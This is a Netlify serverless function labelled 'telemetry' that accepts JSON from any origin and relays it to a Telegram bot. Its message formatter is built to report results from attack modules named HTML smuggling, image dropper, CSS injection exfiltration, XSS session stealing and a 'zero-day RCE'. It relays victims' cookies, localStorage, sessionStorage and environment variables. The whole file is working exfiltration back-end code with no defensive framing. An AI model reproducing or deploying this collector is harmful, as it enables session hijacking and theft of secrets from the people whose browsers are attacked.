// netlify/functions/telemetry.js – FIXED: Correct env var names
exports.handler = async (event, context) => {
  // CORS preflight
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Max-Age': '86400',
      },
      body: '',
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers: { 'Access-Control-Allow-Origin': '*' },
      body: 'Method Not Allowed',
    };
  }

  // CORRECT ENV VAR NAMES (as per your screenshot)
  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    console.error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
    return {
      statusCode: 500,
      headers: { 'Access-Control-Allow-Origin': '*' },
      body: 'Server misconfig: env vars missing',
    };
  }

  let payload;
  try {
    payload = JSON.parse(event.body);
  } catch (e) {
    return {
      statusCode: 400,
      headers: { 'Access-Control-Allow-Origin': '*' },
      body: 'Invalid JSON',
    };
  }

  const msg = formatTelegramMessage(payload);

  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const resp = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: msg,
        parse_mode: 'HTML',
      }),
    });
    const result = await resp.json();
    if (!result.ok) {
      console.error('Telegram error:', result);
      return {
        statusCode: 500,
        headers: { 'Access-Control-Allow-Origin': '*' },
        body: 'Telegram send failed',
      };
    }
    return {
      statusCode: 200,
      headers: { 'Access-Control-Allow-Origin': '*' },
      body: 'OK',
    };
  } catch (err) {
    console.error('Error forwarding to Telegram:', err);
    return {
      statusCode: 500,
      headers: { 'Access-Control-Allow-Origin': '*' },
      body: 'Internal error',
    };
  }
};

function formatTelegramMessage(data) {
  const module = data.module || 'UNKNOWN';
  let lines = [];

  lines.push(`🔴 <b>[${module}]</b>`);
  lines.push(`⏱ ${data.timestamp || new Date().toISOString()}`);

  if (module === 'HTML_SMUGGLING' || module === 'IMAGE_DROPPER_DELIVERED' || module === 'IMAGE_DROPPER_ERROR') {
    lines.push(`📁 File: ${data.filename || 'N/A'}`);
    lines.push(`📦 Size: ${data.size || 'N/A'}`);
    lines.push(`🚦 Status: ${data.status || 'N/A'}`);
    if (data.error) lines.push(`⚠️ Error: ${data.error}`);
  } 
  else if (module === 'CSS_INJECTION') {
    lines.push(`🎨 Vector: ${data.technique || 'Selector attack'}`);
    lines.push(`📋 Exfiltrated: ${data.exfiltrated_data || 'N/A'}`);
    if (data.error) lines.push(`⚠️ Error: ${data.error}`);
  } 
  else if (module === 'CORS_MISCONFIG') {
    lines.push(`🌐 Status: ${data.status || 'N/A'}`);
    lines.push(`📦 Sample: ${JSON.stringify(data.data_sample || {}).substring(0, 200)}`);
    if (data.error) lines.push(`⚠️ Error: ${data.error}`);
  } 
  else if (module === 'XSS_SESSION_STEAL' || module === 'AUTO_TELEMETRY' || module === 'IMAGE_DROPPER_PAYLOAD') {
    lines.push(`🍪 Cookies: ${data.storage?.cookies || data.cookies || 'N/A'}`);
    lines.push(`📦 LocalStorage: ${JSON.stringify(data.storage?.localStorage || data.localStorage || {}).substring(0, 150)}`);
    lines.push(`📦 SessionStorage: ${JSON.stringify(data.storage?.sessionStorage || data.sessionStorage || {}).substring(0, 150)}`);
    lines.push(`📍 Origin: ${data.origin || data.pageUrl || 'N/A'}`);
    if (data.error) lines.push(`⚠️ Error: ${data.error}`);
  } 
  else if (module === 'ZERO_DAY_RCE') {
    lines.push(`💀 Status: ${data.status || 'Executed'}`);
    lines.push(`⚡ Electron: ${data.isElectron ? 'YES (Desktop app)' : 'NO (Browser)'}`);
    lines.push(`🔧 Env: ${JSON.stringify(data.environment_variables || {}).substring(0, 100)}`);
    if (data.error) lines.push(`⚠️ Error: ${data.error}`);
  } 
  else {
    lines.push(`📦 Payload: ${JSON.stringify(data).substring(0, 300)}`);
  }

  return lines.join('\n');
}
